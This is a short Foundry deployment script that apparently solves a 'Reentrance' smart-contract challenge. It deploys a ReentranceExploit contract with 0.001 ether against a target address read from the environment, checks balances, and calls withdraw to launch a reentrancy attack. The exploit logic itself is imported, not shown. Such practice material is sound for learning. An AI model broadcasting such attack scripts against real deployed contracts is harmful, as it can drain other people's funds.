// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance} from "../src/Reentrance.sol";
import {ReentranceExploit} from "../src/Reentrance.e.sol";

contract ReentranceScript is Script {
    Reentrance public target;
    function setUp() public {
        target = Reentrance(payable(vm.envAddress("TARGET_CONTRACT_ADDRESS")));
    }

    function run() public {
        vm.startBroadcast();

        ReentranceExploit reentrance_exploit = new ReentranceExploit{
            value: 0.001 ether
        }(target);
        
        assert(target.balanceOf(address(reentrance_exploit)) == 0.001 ether);
        assert(address(target).balance == 0.002 ether);

        reentrance_exploit.withdraw(0.001 ether);

        vm.stopBroadcast();
    }
}
